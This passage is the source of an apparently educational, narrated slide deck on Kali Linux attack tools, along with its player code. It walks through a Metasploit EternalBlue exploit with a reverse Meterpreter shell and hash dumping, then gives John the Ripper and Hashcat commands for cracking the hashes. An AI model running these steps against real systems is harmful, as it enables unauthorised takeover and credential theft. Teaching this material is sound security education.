                n: "Here is the EternalBlue attack workflow. You open msfconsole and search for the EternalBlue module. You select the exploit targeting SMB on port 445. You set the remote host to the target IP, configure a Meterpreter reverse TCP payload, and run. If the target is vulnerable and unpatched, Metasploit gains a full Meterpreter session, giving you complete control of the remote system. From there, you can dump password hashes, take screenshots, pivot to other machines, and escalate privileges. This is the exact exploit used in the global WannaCry ransomware attack.",
                h: `<div class="code"><span class="cm"># Metasploit EternalBlue workflow</span><br>msf6 > <span class="fl">use</span> exploit/windows/smb/ms17_010_eternalblue<br>msf6 > <span class="fl">set</span> RHOSTS 192.168.1.50<br>msf6 > <span class="fl">set</span> payload windows/x64/meterpreter/reverse_tcp<br>msf6 > <span class="fl">set</span> LHOST 192.168.1.100<br>msf6 > <span class="fl">run</span><br><br><span class="sr">[*] Meterpreter session 1 opened</span><br>meterpreter > <span class="fl">hashdump</span><br>meterpreter > <span class="fl">screenshot</span></div>
<div class="wb"><i class="fas fa-triangle-exclamation"></i><span><strong>Critical:</strong> EternalBlue targets <strong>unpatched Windows SMB (port 445)</strong>. This is why patch management is the #1 defense.</span></div>`},

            {
                t: "Wireshark — The Network Detective", lb: "Tool 4: Wireshark",
                n: "Wireshark is the world's most popular network protocol analyzer. Every piece of data traveling across a network is broken into packets. Wireshark captures all of those packets in real-time and lets you inspect them. If someone logs into a website using HTTP instead of HTTPS, you can literally see their username and password in plaintext. Wireshark operates passively — it does not modify traffic, only observes. Display filters let you isolate specific protocols like HTTP, DNS, or TCP from the thousands of packets flowing through a network.",
                h: `<ul class="bl">
<li><div class="d" style="background:var(--cy)"></div><span><strong style="color:var(--cy)">Packet capture & analysis</strong> — sees every byte crossing the network in real-time</span></li>
<li><div class="d" style="background:var(--cy)"></div><span><strong style="color:var(--cy)">Display filters</strong> narrow down millions of packets: <code style="color:var(--ac);font-family:'Fira Code',monospace">http.request</code>, <code style="color:var(--ac);font-family:'Fira Code',monospace">dns</code>, <code style="color:var(--ac);font-family:'Fira Code',monospace">tcp.port==80</code></span></li>
<li><div class="d" style="background:var(--cy)"></div><span><strong style="color:var(--amb)">Follow TCP Stream</strong> reconstructs entire conversations between client and server</span></li>
<li><div class="d" style="background:var(--cy)"></div><span><strong style="color:var(--rd)">HTTP credentials visible</strong> — unencrypted login forms expose passwords in plaintext</span></li>
<li><div class="d" style="background:var(--cy)"></div><span>Passive tool — <strong style="color:var(--gn)">observes only</strong>, does not modify or inject traffic</span></li>
</ul>
<div class="fb"><i class="fas fa-lightbulb"></i><span><strong>Key takeaway:</strong> Wireshark proves why HTTPS matters. Any site using HTTP exposes all user data to anyone on the network.</span></div>`},

            {
                t: "John the Ripper & Hashcat", lb: "Tool 5: Cracking",
                n: "The final phase of the Kill Chain is credential harvesting. John the Ripper and Hashcat are the two premier password cracking tools. When Metasploit dumps password hashes from a compromised system, the hashes are useless until cracked. John the Ripper is a CPU-based cracker that supports dictionary attacks using wordlists like rockyou.txt. Hashcat leverages GPU acceleration to achieve billions of hash comparisons per second. For the NTLM hashes dumped from Windows systems via Metasploit, Hashcat with a modern GPU can crack most common passwords in minutes.",
                h: `<div class="tc2">
<div class="cd" style="border-color:var(--amb)"><h4 style="color:var(--amb)"><i class="fas fa-microchip"></i> John the Ripper (CPU)</h4>
<ul class="bl"><li><div class="d" style="background:var(--amb)"></div><span>CPU-based cracking</span></li><li><div class="d" style="background:var(--amb)"></div><span>Wordlist: rockyou.txt (14M+)</span></li><li><div class="d" style="background:var(--amb)"></div><span>Auto-detects hash formats</span></li><li><div class="d" style="background:var(--amb)"></div><span>Portable, runs everywhere</span></li></ul></div>
<div class="cd" style="border-color:var(--pp)"><h4 style="color:var(--pp)"><i class="fas fa-bolt"></i> Hashcat (GPU)</h4>
<ul class="bl"><li><div class="d" style="background:var(--pp)"></div><span>GPU-accelerated (billions/sec)</span></li><li><div class="d" style="background:var(--pp)"></div><span>Supports 300+ hash types</span></li><li><div class="d" style="background:var(--pp)"></div><span>Rule-based mutations</span></li><li><div class="d" style="background:var(--pp)"></div><span>Industry standard for auditing</span></li></ul></div>
</div>
<div class="code" style="margin-top:7px"><span class="cm"># John the Ripper</span><br>john <span class="fl">--wordlist=</span>/usr/share/wordlists/rockyou.txt hashes.txt<br><br><span class="cm"># Hashcat (NTLM format)</span><br>hashcat <span class="fl">-m 1000</span> <span class="fl">-a 0</span> hashes.txt rockyou.txt</div>`},

            {
                t: "The Complete Attack Chain", lb: "Summary",
                n: "Let us recap the complete attack chain. Nmap discovered the target network and found open ports. Burp Suite tested the web application on port 80 and found SQL injection. Metasploit exploited SMB on port 445 using EternalBlue and gained a Meterpreter shell. From that shell, we dumped password hashes. Wireshark monitored the network traffic throughout the engagement. John the Ripper and Hashcat cracked the dumped hashes into plaintext passwords. This is the complete Cyber Kill Chain in action, from reconnaissance to credential harvesting.",
                h: `<div style="display:flex;flex-direction:column;gap:4px">
<div class="phase-row" style="border-color:var(--ac);background:var(--acg)"><div class="phase-num" style="background:var(--acg);color:var(--ac)">01</div><div class="phase-body"><div class="phase-name" style="color:var(--ac)">Nmap → Reconnaissance</div><div class="phase-desc">Discovered hosts, ports 22/80/445/3306 open, service versions identified</div></div></div>
<div class="phase-row" style="border-color:var(--ac2);background:var(--or2)"><div class="phase-num" style="background:var(--or2);color:var(--ac2)">02</div><div class="phase-body"><div class="phase-name" style="color:var(--ac2)">Burp Suite → Web Testing</div><div class="phase-desc">Intercepted HTTP traffic, found SQL injection on login form</div></div></div>
<div class="phase-row" style="border-color:var(--rd);background:rgba(255,82,82,.04)"><div class="phase-num" style="background:rgba(255,82,82,.06);color:var(--rd)">03</div><div class="phase-body"><div class="phase-name" style="color:var(--rd)">Metasploit → Exploitation</div><div class="phase-desc">EternalBlue exploit on SMB, Meterpreter session established</div></div></div>
<div class="phase-row" style="border-color:var(--cy);background:rgba(0,229,255,.04)"><div class="phase-num" style="background:rgba(0,229,255,.06);color:var(--cy)">04</div><div class="phase-body"><div class="phase-name" style="color:var(--cy)">Wireshark → Monitoring</div><div class="phase-desc">Captured all network traffic, verified data exfiltration paths</div></div></div>
<div class="phase-row" style="border-color:var(--amb);background:rgba(255,213,79,.04)"><div class="phase-num" style="background:rgba(255,213,79,.06);color:var(--amb)">05</div><div class="phase-body"><div class="phase-name" style="color:var(--amb)">John/Hashcat → Credential Harvest</div><div class="phase-desc">Cracked NTLM hashes from hashdump into plaintext passwords</div></div></div>
</div>`},

            {
                t: "Conclusion — Tools Without Ethics Are Weapons", lb: "Conclusion",
                n: "To conclude: you now understand the five pillars of Kali Linux offensive tools. Nmap finds the targets. Burp Suite tests web applications. Metasploit exploits vulnerabilities. Wireshark analyzes network traffic. John the Ripper and Hashcat crack credentials. But remember this above everything. Tools without ethics are weapons. Every command you learn comes with the weight of responsibility. Use this knowledge to protect systems, find vulnerabilities before attackers do, and build a career in ethical cybersecurity. Never cross the line.",
                h: `<div class="ts" style="text-align:left;align-items:flex-start">
<div style="font-size:clamp(14px,2.2vw,22px);font-weight:700;color:var(--fg);margin-bottom:10px;line-height:1.3">Tools Without Ethics Are Weapons</div>
<ul class="bl">
<li><div class="d" style="background:var(--ac)"></div><span><strong style="color:var(--ac)">Nmap</strong> finds the doors — network reconnaissance and port discovery</span></li>
<li><div class="d" style="background:var(--ac2)"></div><span><strong style="color:var(--ac2)">Burp Suite</strong> manipulates the locks — web application proxy and testing</span></li>
<li><div class="d" style="background:var(--rd)"></div><span><strong style="color:var(--rd)">Metasploit</strong> kicks them down — modular exploitation framework</span></li>
<li><div class="d" style="background:var(--cy)"></div><span><strong style="color:var(--cy)">Wireshark</strong> watches everything — passive packet capture and analysis</span></li>
<li><div class="d" style="background:var(--amb)"></div><span><strong style="color:var(--amb)">John/Hashcat</strong> cracks the safes — CPU and GPU password auditing</span></li>
</ul>
<div style="margin-top:14px;padding:10px 14px;background:rgba(255,82,82,.05);border:1px solid rgba(255,82,82,.12);border-radius:6px;font-family:'Fira Code',monospace;font-size:clamp(9px,1.1vw,12px);color:var(--rd);line-height:1.6">
"Every command you learn comes with the weight of responsibility.<br>Use this knowledge to protect. Never to destroy."
</div>
</div>`}
        ];

        const st2 = { cur: 0, play: false, up: false, spd: 1, vol: 1, mut: false, start: false, ss: 0, se: 0, pt: null, utt: null };
        D.forEach(s => { s.w = s.n.split(/\s+/).length; s.dur = (s.w / 140) * 60 });
        const totD2 = D.reduce((a, s) => a + s.dur, 0);
        const $ = id => document.getElementById(id);
        const sa2 = $('sa2'), pl3 = $('pl3'), pli2 = $('pli2'), pv2 = $('pv2'), nx2 = $('nx2'), pw4 = $('pw4'), pf3 = $('pf3'), td2 = $('td2'), ss3 = $('ss3'), vs3 = $('vs3'), vb2 = $('vb2'), vi2 = $('vi2'), ct2 = $('ct2'), cp2 = $('cp2'), cl2 = $('cl2'), io3 = $('io3'), eo3 = $('eo3'), sbt2 = $('sbt2'), rbt2 = $('rbt2'), si3 = $('si3'), ti2 = $('ti2'), tst3 = $('tst3');

        function fmt2(s) { const m = Math.floor(s / 60).toString().padStart(2, '0'), sc = Math.floor(s % 60).toString().padStart(2, '0'); return m + ':' + sc }
        function toast2(m) { tst3.textContent = m; tst3.classList.add('sh'); setTimeout(() => tst3.classList.remove('sh'), 2200) }
        function getEl2() { let t = 0; for (let i = 0; i < st2.cur; i++) t += D[i].dur; t += st2.se; return t }

        function buildS() { sa2.innerHTML = ''; D.forEach((s, i) => { const d = document.createElement('div'); d.className = 'sl' + (i === 0 ? ' on' : ''); d.id = 's2-' + i; d.innerHTML = `<div class="slb">${s.lb}</div><div class="slt">${s.t}</div><div class="sbd">${s.h}</div>`; sa2.appendChild(d) }) }
        function buildC() { cl2.innerHTML = ''; D.forEach((s, i) => { const d = document.createElement('div'); d.className = 'ci' + (i === 0 ? ' on' : ''); d.innerHTML = `<span class="nm">${i + 1}</span><span class="label">${s.t}</span>`; d.addEventListener('click', () => seek2(i)); cl2.appendChild(d) }) }

        function render2(idx, dir = 'next') {
            const prev = sa2.querySelector('.sl.on'), next = $('s2-' + idx);
            if (!next || prev === next) return;
            if (prev) { prev.classList.remove('on'); prev.classList.add(dir === 'next' ? 'ex' : ''); setTimeout(() => prev.classList.remove('ex'), 420) }
            next.classList.add('on');
            next.querySelectorAll('.bl li').forEach((li, i) => { li.style.animation = 'none'; li.offsetHeight; li.style.animationDelay = (i * .1) + 's'; li.style.animation = '' });
            cl2.querySelectorAll('.ci').forEach((e, i) => e.classList.toggle('on', i === idx));
            ti2.textContent = D[idx].t; st2.se = 0; upd2();
        }

        function spk(txt) {
            if (!('speechSynthesis' in window)) { toast2('TTS not supported'); return }
            speechSynthesis.cancel();
            const u = new SpeechSynthesisUtterance(txt); u.rate = st2.spd; u.pitch = 1; u.volume = st2.mut ? 0 : st2.vol;
            const v = speechSynthesis.getVoices();
            const p = v.find(x => x.lang.startsWith('en') && x.name.includes('Google')) || v.find(x => x.lang.startsWith('en') && x.localService) || v.find(x => x.lang.startsWith('en'));
            if (p) u.voice = p;
            u.onend = () => { if (!st2.up && st2.play) { if (st2.cur < D.length - 1) nxt2(); else { stp2(); eo3.classList.add('vis') } } si3.classList.remove('vis') };
            u.onerror = e => { if (e.error !== 'canceled') si3.classList.remove('vis') };
            st2.utt = u; speechSynthesis.speak(u); si3.classList.add('vis');
        }

        function doP() { st2.play = true; st2.up = false; st2.ss = Date.now() - (st2.se * 1000); pli2.className = 'fas fa-pause'; spk(D[st2.cur].n); startPT2() }
        function doPa() { st2.up = true; st2.play = false; st2.se = (Date.now() - st2.ss) / 1000; pli2.className = 'fas fa-play'; speechSynthesis.pause(); si3.classList.remove('vis'); stopPT2() }
        function togP() { if (!st2.start) return; st2.play ? doPa() : doP() }
        function nxt2() { if (st2.cur >= D.length - 1) return; speechSynthesis.cancel(); st2.cur++; render2(st2.cur, 'next'); if (st2.play) { st2.ss = Date.now(); st2.se = 0; spk(D[st2.cur].n) } else upd2() }
        function prv2() { if (st2.cur <= 0) return; speechSynthesis.cancel(); si3.classList.remove('vis'); const w = st2.play; st2.play = false; st2.cur--; st2.se = 0; render2(st2.cur, 'prev'); upd2(); if (w) setTimeout(() => doP(), 100) }
        function seek2(idx) { if (idx === st2.cur) return; speechSynthesis.cancel(); si3.classList.remove('vis'); const w = st2.play; st2.play = false; st2.cur = idx; st2.se = 0; render2(idx); upd2(); if (w) setTimeout(() => doP(), 100) }
        function stp2() { st2.play = false; st2.up = false; pli2.className = 'fas fa-play'; speechSynthesis.cancel(); si3.classList.remove('vis'); stopPT2() }
        function startPT2() { stopPT2(); st2.pt = setInterval(() => { st2.se = (Date.now() - st2.ss) / 1000; upd2() }, 200) }
        function stopPT2() { if (st2.pt) { clearInterval(st2.pt); st2.pt = null } }
        function upd2() { const e = getEl2(), p = Math.min((e / totD2) * 100, 100); pf3.style.width = p + '%'; td2.textContent = fmt2(e) + ' / ' + fmt2(totD2) }

        pl3.addEventListener('click', togP); pv2.addEventListener('click', prv2); nx2.addEventListener('click', nxt2);
        ss3.addEventListener('change', () => { st2.spd = parseFloat(ss3.value); if (st2.play) { st2.ss = Date.now() - (st2.se * 1000); spk(D[st2.cur].n) } toast2('Speed: ' + ss3.value + 'x') });
        vs3.addEventListener('input', () => { st2.vol = parseFloat(vs3.value); st2.mut = false; vi2.className = st2.vol === 0 ? 'fas fa-volume-xmark' : st2.vol < .5 ? 'fas fa-volume-low' : 'fas fa-volume-high'; if (st2.utt) st2.utt.volume = st2.vol });
        vb2.addEventListener('click', () => { st2.mut = !st2.mut; vi2.className = st2.mut ? 'fas fa-volume-xmark' : 'fas fa-volume-high'; if (st2.utt) st2.utt.volume = st2.mut ? 0 : st2.vol });
        ct2.addEventListener('click', () => { cp2.classList.toggle('op'); ct2.classList.toggle('on') });
        pw4.addEventListener('click', e => { const r = pw4.getBoundingClientRect(), p = (e.clientX - r.left) / r.width, tt = p * totD2; let a = 0; for (let i = 0; i < D.length; i++) { if (a + D[i].dur >= tt) { seek2(i); const w = tt - a; st2.se = w; st2.ss = Date.now() - (w * 1000); upd2(); break } a += D[i].dur } });
        sbt2.addEventListener('click', () => { st2.start = true; io3.classList.add('hid'); if (speechSynthesis.getVoices().length === 0) { speechSynthesis.addEventListener('voiceschanged', () => doP(), { once: true }) } else doP() });
        rbt2.addEventListener('click', () => { eo3.classList.remove('vis'); st2.cur = 0; st2.se = 0; render2(0, 'prev'); upd2(); setTimeout(() => doP(), 300) });

        document.addEventListener('keydown', e => {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
            switch (e.code) {
                case 'Space': e.preventDefault(); if (!st2.start) { sbt2.click(); return } togP(); break;
                case 'ArrowRight': e.preventDefault(); nxt2(); break;
                case 'ArrowLeft': e.preventDefault(); prv2(); break;
                case 'ArrowUp': e.preventDefault(); st2.spd = Math.min(st2.spd + .25, 2); ss3.value = st2.spd.toString(); if (st2.play) { st2.ss = Date.now() - (st2.se * 1000); spk(D[st2.cur].n) } toast2('Speed: ' + st2.spd + 'x'); break;
                case 'ArrowDown': e.preventDefault(); st2.spd = Math.max(st2.spd - .25, .5); ss3.value = st2.spd.toString(); if (st2.play) { st2.ss = Date.now() - (st2.se * 1000); spk(D[st2.cur].n) } toast2('Speed: ' + st2.spd + 'x'); break;
                case 'KeyM': vb2.click(); break;
                case 'KeyF': if (document.fullscreenElement) document.exitFullscreen(); else $('pl2').requestFullscreen?.(); break;
                case 'Escape': cp2.classList.remove('op'); ct2.classList.remove('on'); break;
            }
        });
        document.addEventListener('visibilitychange', () => { if (document.hidden && st2.play) doPa() });
        if ('speechSynthesis' in window) { speechSynthesis.getVoices(); speechSynthesis.addEventListener('voiceschanged', () => speechSynthesis.getVoices(), { once: true }) }

        buildS(); buildC(); upd2();
    </script>
